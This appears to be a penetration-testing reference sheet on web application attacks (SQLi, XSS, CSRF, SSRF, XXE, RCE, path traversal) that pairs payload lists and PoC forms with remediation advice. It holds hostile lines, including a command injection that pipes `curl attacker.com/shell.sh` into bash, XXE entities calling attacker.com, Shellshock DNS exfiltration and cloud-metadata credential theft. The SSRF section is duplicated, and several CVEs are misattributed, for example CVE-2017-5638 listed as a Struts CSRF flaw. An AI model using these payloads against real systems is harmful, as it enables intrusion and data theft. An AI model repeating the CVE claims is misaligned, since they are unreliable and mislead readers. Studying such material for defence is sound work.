# Web Application Attacks Reference

## Overview
Web application attacks target vulnerabilities in web-based systems, APIs, and client-side code. These attacks exploit weaknesses in input validation, authentication, session management, and business logic.

**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)

---

## SQL Injection (SQLi)

### Description
SQL injection is a critical web security vulnerability that allows attackers to interfere with database queries, potentially leading to unauthorized data access, modification, or deletion. It occurs when untrusted data is concatenated into SQL queries without proper sanitization or parameterization.

**For comprehensive SQL injection documentation including all 18 PortSwigger labs with detailed solutions, see [sql-injection.md](./sql-injection.md)**

### Quick Reference

**Types:**
- **In-Band SQLi**: Error-based, Union-based (results visible in application response)
- **Blind SQLi**: Boolean-based, Time-based (no visible results, inference required)
- **Out-of-Band SQLi**: DNS/HTTP exfiltration (asynchronous data extraction)

**Tools:**
- sqlmap (automated testing)
- Burp Suite (Proxy, Repeater, Intruder, Collaborator)
- jSQL Injection (GUI-based tool)
- Manual testing with custom payloads

**Quick Test Payloads:**
```sql
# Basic injection tests
'
' OR 1=1--
admin'--

# UNION-based extraction
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

# Blind boolean-based
' AND 1=1--
' AND 1=2--

# Time-based blind
'; SELECT pg_sleep(10)--
' AND SLEEP(5)#
```

**Prevention (Essential):**
1. **Use parameterized queries/prepared statements** (PRIMARY DEFENSE)
2. Implement input validation (whitelist approach)
3. Apply principle of least privilege for database accounts
4. Use ORM frameworks correctly
5. Deploy WAF protection
6. Regular security testing and code reviews

**Key Resources:**
- [Comprehensive SQL Injection Reference](./sql-injection.md) - Complete PortSwigger labs documentation
- **OWASP**: A03:2021 – Injection
- **CWE**: CWE-89 (SQL Injection)
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **CAPEC**: CAPEC-66 (SQL Injection)

**Notable CVEs:**
- CVE-2021-22005 (VMware vCenter) - CVSS 9.8
- CVE-2019-0193 (Apache Solr) - CVSS 9.8
- CVE-2020-28458 (Drupal Core) - CVSS 8.8

---

## Cross-Site Scripting (XSS)

### Description
XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users.

### Types
- **Reflected XSS**: Non-persistent, delivered via URL
- **Stored XSS**: Persistent, saved in database
- **DOM-based XSS**: Client-side JavaScript vulnerability

### Tools
- XSStrike
- Burp Suite XSS Validator
- OWASP ZAP
- Browser Developer Tools
- BeEF (Browser Exploitation Framework)

### Testing Methodology
1. Identify input reflection points
2. Test with basic payloads: `<script>alert(1)</script>`
3. Bypass filters with encoding and obfuscation
4. Test for DOM-based XSS in client-side JavaScript
5. Verify execution context (HTML, attribute, JavaScript)
6. Test persistence for stored XSS

### Example Payloads
```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(String.fromCharCode(88,83,83))</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
```

### Detection Methods
- Content Security Policy (CSP) monitoring
- XSS protection headers (X-XSS-Protection)
- Input validation monitoring
- Output encoding verification

### Remediation
- Implement output encoding/escaping
- Use Content Security Policy (CSP)
- Apply input validation
- Use HTTPOnly and Secure flags on cookies
- Implement X-XSS-Protection header
- Use template engines with auto-escaping

### References
- **OWASP**: A03:2021 – Injection
- **CWE**: CWE-79 (Cross-site Scripting)
- **CVE Examples**: CVE-2021-38314, CVE-2022-1234
- **CAPEC**: CAPEC-86 (XSS)

---

## Cross-Site Request Forgery (CSRF)

### Description
Cross-Site Request Forgery (CSRF) is a critical web security vulnerability that forces an authenticated user's browser to perform unwanted actions on a web application. The attacker tricks the victim into submitting malicious requests using their existing session, potentially leading to account takeover, unauthorized transactions, data modification, or administrative action abuse.

**For comprehensive CSRF documentation including all 11 PortSwigger labs with detailed solutions and bypass techniques, see [csrf-portswigger-labs-complete.md](./csrf-portswigger-labs-complete.md)**

### Quick Reference

**Types:**
- **Basic CSRF**: No token validation (simple form auto-submit)
- **Token-Based Bypass**: Method-based validation, session binding issues, presence checks
- **Referer-Based Bypass**: Header suppression, substring matching
- **SameSite Bypass**: Client-side redirects, sibling domain XSS, method override

**Tools:**
- Burp Suite (CSRF PoC Generator, Proxy, Repeater)
- OWASP ZAP (automated CSRF detection)
- Manual HTML form creation
- Browser Developer Tools

### Testing Methodology
1. Identify state-changing operations (email change, password change, fund transfer)
2. Check for CSRF tokens in requests
3. Test token validation:
   - Remove token entirely
   - Use invalid token value
   - Use another user's token
   - Change HTTP method (POST to GET)
4. Test Referer/Origin header validation:
   - Remove headers
   - Modify to attacker domain
   - Include legitimate domain in query string
5. Test SameSite cookie attributes
6. Look for cookie injection points (CRLF)
7. Test method override parameters (_method=POST)
8. Create proof-of-concept HTML page

### Example Attacks

**Basic CSRF (No Protection):**
```html
<form method="POST" action="https://target.com/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Method-Based Bypass (POST → GET):**
```html
<form action="https://target.com/account/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Cookie Injection + CSRF:**
```html
<form method="POST" action="https://target.com/change-email">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="csrf" value="fake">
</form>
<img src="https://target.com/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

**Referer Suppression:**
```html
<html>
  <head>
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form method="POST" action="https://target.com/change-email">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**SameSite Lax Bypass (Method Override):**
```html
<script>
  document.location = "https://target.com/change-email?email=pwned@attacker.com&_method=POST";
</script>
```

### Common Bypass Techniques

1. **Token Not Tied to Session**: Use attacker's token for any user
2. **Token in Separate Cookie**: Inject csrfKey cookie via CRLF
3. **Double Submit Cookie**: Inject matching cookie and parameter
4. **Token Validation When Present**: Simply omit the token
5. **Referer Validation When Present**: Use `no-referrer` meta tag
6. **Broken Referer Validation**: Include legitimate domain in query string with `unsafe-url` policy
7. **SameSite Strict via Redirect**: Path traversal through same-site redirect gadget
8. **SameSite Strict via Sibling Domain**: XSS on subdomain for same-site attack
9. **SameSite Lax via Method Override**: Use `_method=POST` in GET with top-level navigation

### Detection Methods
- CSRF token presence and validation monitoring
- SameSite cookie attribute verification
- Referer/Origin header validation
- Custom header requirements for AJAX
- Unusual state-changing request patterns
- Cross-origin request detection
- Token reuse detection

### Remediation (Defense in Depth)

**Primary Defense - CSRF Tokens:**
```python
# Generate cryptographically secure token
token = secrets.token_urlsafe(32)
session['csrf_token'] = token

# Validate on every state-changing request
def validate_csrf(request, session):
    token = request.form.get('csrf')
    if not token:
        return False  # Require presence
    if token != session.get('csrf_token'):
        return False  # Validate against session
    return True
```

**Secondary Defense - SameSite Cookies:**
```
Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/
```

**Additional Defenses:**
- Verify Referer and Origin headers (supplementary)
- Require re-authentication for critical actions
- Implement custom request headers for AJAX
- Use framework-provided CSRF protection
- Enforce proper HTTP method usage (POST for state changes)
- Prevent header injection vulnerabilities
- Scope cookies to specific domains
- Implement rate limiting on sensitive endpoints

### Real-World Impact Examples
- **Account Takeover**: Email change → password reset → full account access
- **Financial Fraud**: Unauthorized fund transfers in banking applications
- **Administrative Abuse**: Creating admin accounts, modifying permissions
- **Data Manipulation**: Changing settings, deleting records
- **Social Engineering**: Making posts, sending messages as victim

### Key Resources
- [Complete CSRF Lab Guide](./csrf-portswigger-labs-complete.md) - All 11 PortSwigger labs with detailed solutions
- [CSRF Quick Start Guide](./csrf-quickstart.md) - Fast reference for testing and exploitation
- **OWASP**: A01:2021 – Broken Access Control
- **OWASP CSRF Prevention Cheat Sheet**: https://cheatsheetsecurity.org/cheatsheets/cross-site-request-forgery-prevention-cheat-sheet.html
- **CWE**: CWE-352 (Cross-Site Request Forgery)
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **CAPEC**: CAPEC-62 (CSRF)

### Notable CVEs
- **CVE-2020-9484**: Apache Tomcat CSRF via session fixation
- **CVE-2021-3129**: Laravel Framework CSRF bypass
- **CVE-2018-1000600**: Jenkins CSRF vulnerability
- **CVE-2017-5638**: Apache Struts CSRF (Equifax breach)

### Framework-Specific Implementation

**Django:**
```python
from django.views.decorators.csrf import csrf_protect
@csrf_protect
def change_email(request):
    # CSRF automatically validated
```

**Flask:**
```python
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```

**Express.js:**
```javascript
const csrf = require('csurf');
app.use(csrf({ cookie: true }));
```

---

## Server-Side Request Forgery (SSRF)

### Description
Server-Side Request Forgery (SSRF) is a critical web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing. SSRF can lead to unauthorized actions, access to internal systems, cloud metadata exposure, and potential remote code execution.

**For comprehensive SSRF documentation including all 8 PortSwigger labs with detailed solutions, bypass techniques, and cloud exploitation, see [ssrf-portswigger-labs-complete.md](./ssrf-portswigger-labs-complete.md)**

### Quick Reference

**Types:**
- **Basic SSRF**: Direct access to localhost/internal services
- **Blind SSRF**: No visible response, detected via out-of-band channels
- **Filter Bypass**: Circumventing blacklist/whitelist protections
- **Cloud Metadata**: AWS/Azure/GCP credential theft via 169.254.169.254

**Common Vulnerable Parameters:**
```
url=
uri=
path=
redirect=
fetch=
stockApi=
callback=
webhook=
logo_uri=
```

**Tools:**
- Burp Suite (Proxy, Repeater, Intruder, Collaborator)
- SSRFmap (automated exploitation)
- Gopherus (Gopher protocol payload generation)
- ffuf (fuzzing and enumeration)

### Testing Methodology
1. Identify URL parameters that accept URLs/URIs
2. Test localhost access: `http://127.0.0.1/`, `http://localhost/`
3. Test internal network: `http://192.168.0.1/`, `http://10.0.0.1/`
4. Test cloud metadata: `http://169.254.169.254/latest/meta-data/`
5. Test with Burp Collaborator for blind SSRF
6. Attempt bypass techniques if blocked
7. Scan internal ports and services
8. Access sensitive endpoints (/admin, /internal, etc.)

### Quick Test Payloads
```bash
# Localhost representations
http://127.0.0.1/
http://127.1/
http://localhost/
http://[::1]/
http://2130706433/     # Decimal
http://0x7f000001/     # Hex

# AWS metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Bypass blacklist
http://127.1/%2561dmin              # Double-encoded admin

# Bypass whitelist
http://localhost:80%2523@trusted.com/admin

# Blind SSRF detection
Referer: http://abc123.burpcollaborator.net
```

### Common Attack Scenarios

**1. AWS Metadata Theft:**
```http
POST /fetch HTTP/1.1
stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
```
Response contains AccessKeyId, SecretAccessKey, Token

**2. Internal Admin Access:**
```http
POST /product/stock HTTP/1.1
stockApi=http://localhost/admin/delete?username=victim
```

**3. Blind SSRF with Shellshock:**
```http
GET /product HTTP/1.1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).burpcollaborator.net
Referer: http://192.168.0.1:8080
```

**4. OpenID Dynamic Registration:**
```http
POST /reg HTTP/1.1
{
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

### Bypass Techniques

**Blacklist Bypass:**
- Alternative IPs: `127.1`, `2130706433`, `0x7f000001`, `[::1]`
- Double encoding: `%2561dmin` (bypasses /admin filter)
- Case variation: `LocalHost`, `LOCALHOST`

**Whitelist Bypass:**
- Credentials format: `http://localhost@trusted.com/`
- Fragment encoding: `http://localhost:80%2523@trusted.com/admin`
- Open redirect: `http://trusted.com/redirect?url=http://localhost/`
- Subdomain confusion: `http://trusted.com.attacker.com/`

**Protocol Smuggling:**
```bash
gopher://127.0.0.1:6379/_KEYS%20*        # Redis
file:///etc/passwd                        # File read
dict://127.0.0.1:11211/stats             # Memcached
```

### Detection Methods
- **Direct**: Different responses for localhost vs external URLs
- **Timing**: Port scan based on response times
- **Out-of-Band**: DNS/HTTP callbacks to Burp Collaborator
- **Error Messages**: Internal paths/IPs in error responses

### Remediation (Defense in Depth)

**Input Validation:**
```python
# Allowlist approach
ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com']

# Block private IPs
BLOCKED_RANGES = ['127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
                  '192.168.0.0/16', '169.254.0.0/16']

# Validate URL and resolved IP
def is_safe_url(url):
    parsed = urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False

    ip = socket.gethostbyname(parsed.hostname)
    if is_private_ip(ip):
        return False

    return True
```

**Network Security:**
- Network segmentation
- Firewall rules for outbound connections
- Use IMDSv2 for AWS (requires session token)
- Disable unused protocols (file://, gopher://, dict://)

**Application Security:**
- Don't return raw responses to users
- Sanitize error messages
- Implement rate limiting
- Log all URL fetch requests
- Use minimal permission service accounts

### Real-World Impact Examples
- **Capital One (2019)**: SSRF → AWS metadata → 100M+ records, $80M fine
- **VMware vCenter (CVE-2021-21972)**: SSRF → Pre-auth RCE
- **Grafana (CVE-2020-13379)**: SSRF → AWS/Azure/GCP credential theft
- **Oracle E-Business (CVE-2025-61882)**: SSRF + CRLF → Auth bypass → RCE

### Key Resources
- [Complete SSRF Lab Guide](./ssrf-portswigger-labs-complete.md) - All 8 PortSwigger labs with detailed solutions
- [SSRF Quick Start Guide](./ssrf-quickstart.md) - Fast reference for testing and exploitation (25 min full lab completion)
- [SSRF Cheat Sheet](./ssrf-cheat-sheet.md) - Comprehensive payload and bypass reference
- **OWASP**: A01:2021 – Broken Access Control (SSRF merged into #1)
- **OWASP SSRF Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- **CWE**: CWE-918 (Server-Side Request Forgery)
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1552.005 (Cloud Instance Metadata API)

### Notable CVEs
- **CVE-2021-21972**: VMware vCenter SSRF → RCE (CVSS 9.8)
- **CVE-2020-13379**: Grafana SSRF → AWS metadata access
- **CVE-2019-9082**: WordPress Social Warfare plugin SSRF
- **CVE-2018-8004**: Apache Camel SSRF via Host header
- **CVE-2025-61882**: Oracle E-Business Suite SSRF (CVSS 9.8) - Exploited by Cl0p ransomware in 2025

### Lab Completion Summary

| Lab | Difficulty | Time | Key Technique |
|-----|-----------|------|---------------|
| Basic Localhost | Apprentice | 2 min | Direct localhost access |
| Backend System | Apprentice | 3 min | Intruder IP scanning |
| Blacklist Filter | Practitioner | 2 min | Double encoding bypass |
| Whitelist Filter | Expert | 3 min | Fragment encoding bypass |
| Blind OOB | Practitioner | 1 min | Burp Collaborator detection |
| Shellshock | Expert | 5 min | DNS exfiltration + RCE |
| OpenID SSRF | Expert | 4 min | AWS metadata via logo_uri |
| Flawed Parsing | Expert | 5 min | Host header injection |

**Total time to complete all labs**: ~25 minutes with practice

---

## Authentication Bypass

### Description
Exploiting weaknesses in authentication mechanisms to gain unauthorized access.

### Common Vulnerabilities
- Default credentials
- Weak password policies
- SQL injection in login forms
- Session fixation
- Broken authentication logic
- OAuth misconfigurations

### Tools
- Burp Suite Intruder
- Hydra
- Custom scripts
- Browser Developer Tools

### Testing Methodology
1. Test default credentials
2. Enumerate valid usernames
3. Test password reset functionality
4. Analyze authentication tokens
5. Test for SQL injection in login
6. Test multi-factor authentication bypass
7. Check for insecure direct object references

### Example Techniques
```
# SQL injection bypass
admin' OR '1'='1'--

# Authentication logic bypass
username=admin&password=wrong&authenticated=true

# Session fixation
Set session ID before authentication
```

### Detection Methods
- Failed login attempt monitoring
- Account lockout mechanisms
- Multi-factor authentication
- Behavioral analysis

### Remediation
- Enforce strong password policies
- Implement account lockout
- Use multi-factor authentication
- Secure password reset flows
- Implement rate limiting
- Use secure session management

### References
- **OWASP**: A07:2021 – Identification and Authentication Failures
- **CWE**: CWE-287 (Improper Authentication)
- **CVE Examples**: CVE-2021-28378, CVE-2022-0944
- **CAPEC**: CAPEC-114 (Authentication Abuse)

---

## Server-Side Request Forgery (SSRF)

### Description
SSRF vulnerabilities allow attackers to make the server perform requests to arbitrary destinations.

### Tools
- Burp Suite Collaborator
- SSRFmap
- Manual testing with various URL schemes

### Testing Methodology
1. Identify URL input parameters
2. Test internal IP ranges (127.0.0.1, 192.168.x.x, 10.x.x.x)
3. Test cloud metadata endpoints (169.254.169.254)
4. Test different URL schemes (file://, gopher://, dict://)
5. Bypass filters with URL encoding and redirects
6. Test DNS rebinding attacks

### Example Payloads
```
http://127.0.0.1:80
http://localhost:8080
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
http://0.0.0.0:6379
http://[::1]:80
```

### Detection Methods
- URL allowlist validation
- Network egress filtering
- SSRF protection libraries
- DNS query monitoring

### Remediation
- Implement URL allowlists
- Disable unnecessary URL schemas
- Use network segmentation
- Filter internal IP ranges
- Implement DNS resolution validation

### References
- **OWASP**: A10:2021 – Server-Side Request Forgery
- **CWE**: CWE-918 (SSRF)
- **CVE Examples**: CVE-2021-21311, CVE-2022-27593
- **CAPEC**: CAPEC-664 (SSRF)

---

## XML External Entity (XXE)

### Description
XXE attacks exploit vulnerable XML processors to access files, perform SSRF, or cause denial of service.

**⭐ For comprehensive XXE documentation, see:**
- **[xxe-portswigger-labs-complete.md](./xxe-portswigger-labs-complete.md)** - Complete lab solutions (all 9 labs)
- **[xxe-quickstart.md](./xxe-quickstart.md)** - Quick reference for rapid testing
- **[xxe-cheat-sheet.md](./xxe-cheat-sheet.md)** - Complete payload library and commands

### Tools
- Burp Suite Professional (with Collaborator)
- XXEinjector
- XXExploiter
- dtd-finder
- Manual payload crafting

### Testing Methodology
1. Identify XML input points
2. Test with external entity definitions
3. Attempt file disclosure
4. Test for blind XXE with out-of-band techniques
5. Test for SSRF via XXE

### Example Payloads
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect">]>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;]>
```

### Detection Methods
- XML parser configuration monitoring
- External entity resolution detection
- Network anomaly detection

### Remediation
- Disable external entity processing
- Use less complex data formats (JSON)
- Implement input validation
- Apply XML parser security configurations
- Use allowlists for XML schemas

### References
- **OWASP**: A05:2021 – Security Misconfiguration
- **CWE**: CWE-611 (XXE)
- **CVE Examples**: CVE-2021-39144, CVE-2022-23181
- **CAPEC**: CAPEC-221 (XXE)

---

## Insecure Deserialization

### Description
Exploiting deserialization of untrusted data to achieve remote code execution or other attacks.

### Affected Languages/Frameworks
- Java (ObjectInputStream)
- PHP (unserialize)
- Python (pickle)
- .NET (BinaryFormatter)
- Ruby (Marshal)

### Tools
- ysoserial (Java)
- phpggc (PHP)
- Burp Suite extensions (Java Deserialization Scanner)

### Testing Methodology
1. Identify serialized objects in traffic
2. Analyze serialization format
3. Generate malicious payloads
4. Test for code execution
5. Look for type confusion vulnerabilities

### Detection Methods
- Signature-based detection of serialized objects
- Monitoring deserialization operations
- Runtime application self-protection (RASP)

### Remediation
- Avoid deserializing untrusted data
- Use safe serialization formats (JSON)
- Implement integrity checks (HMAC)
- Restrict deserializable classes
- Use latest patched versions

### References
- **OWASP**: A08:2021 – Software and Data Integrity Failures
- **CWE**: CWE-502 (Deserialization of Untrusted Data)
- **CVE Examples**: CVE-2015-4852 (WebLogic), CVE-2017-5638 (Struts)
- **CAPEC**: CAPEC-586 (Object Injection)

---

## Directory Traversal / Path Traversal

### Description
Exploiting insufficient input validation to access files and directories outside the web root.

### Tools
- Burp Suite Intruder
- DotDotPwn
- Manual testing

### Testing Methodology
1. Identify file path parameters
2. Test with ../ sequences
3. Try various encoding methods
4. Test absolute paths
5. Attempt to access sensitive files

### Example Payloads
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/var/www/../../etc/passwd
```

### Detection Methods
- Input validation monitoring
- File access pattern analysis
- Path normalization verification

### Remediation
- Use allowlists for file access
- Implement path canonicalization
- Use chroot environments
- Avoid user input in file paths
- Apply strict input validation

### References
- **OWASP**: A01:2021 – Broken Access Control
- **CWE**: CWE-22 (Path Traversal)
- **CVE Examples**: CVE-2021-41773 (Apache), CVE-2022-24086
- **CAPEC**: CAPEC-126 (Path Traversal)

---

## Remote Code Execution (RCE)

### Description
Exploiting vulnerabilities to execute arbitrary code on the target system.

### Common Vectors
- Command injection
- Unsafe deserialization
- Template injection
- File upload vulnerabilities
- Unsafe file inclusion

### Tools
- Commix (command injection)
- Weevely (PHP webshells)
- Burp Suite
- Custom exploit scripts

### Testing Methodology
1. Identify input evaluation points
2. Test command injection payloads
3. Test template injection
4. Analyze file upload functionality
5. Test for PHP/ASP/JSP code execution

### Example Payloads
```bash
# Command injection
; ls -la
| whoami
`id`
$(curl attacker.com/shell.sh | bash)

# Template injection (Jinja2)
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Detection Methods
- Runtime application monitoring
- Command execution detection
- Process spawning monitoring
- Behavioral analysis

### Remediation
- Avoid executing system commands
- Use safe APIs instead of shell execution
- Implement strict input validation
- Use sandboxing and containerization
- Apply principle of least privilege

### References
- **OWASP**: A03:2021 – Injection
- **CWE**: CWE-78 (OS Command Injection), CWE-94 (Code Injection)
- **CVE Examples**: CVE-2021-44228 (Log4Shell), CVE-2022-22965 (Spring4Shell)
- **CAPEC**: CAPEC-88 (OS Command Injection)

---

## API Security Issues

### Description
Vulnerabilities specific to REST APIs, GraphQL, and other API implementations.

### Common Issues
- Broken object level authorization (BOLA/IDOR)
- Broken authentication
- Excessive data exposure
- Lack of rate limiting
- Mass assignment
- Security misconfiguration

### Tools
- Postman
- Burp Suite
- OWASP ZAP
- Arjun (parameter discovery)
- ffuf/wfuzz (API fuzzing)

### Testing Methodology
1. Enumerate API endpoints
2. Test authentication mechanisms
3. Test authorization for each resource
4. Fuzz parameters and methods
5. Test rate limiting
6. Analyze API responses for data exposure
7. Test for mass assignment vulnerabilities

### Detection Methods
- API gateway monitoring
- Rate limiting enforcement
- Authorization policy enforcement
- API schema validation

### Remediation
- Implement proper authentication
- Enforce object-level authorization
- Use rate limiting
- Implement API schema validation
- Minimize data exposure
- Use API security gateways

### References
- **OWASP API Security Top 10**
- **CWE**: CWE-639 (Authorization Bypass), CWE-918 (SSRF)
- **CVE Examples**: CVE-2021-32784, CVE-2022-0866
- **CAPEC**: CAPEC-122 (API Manipulation)
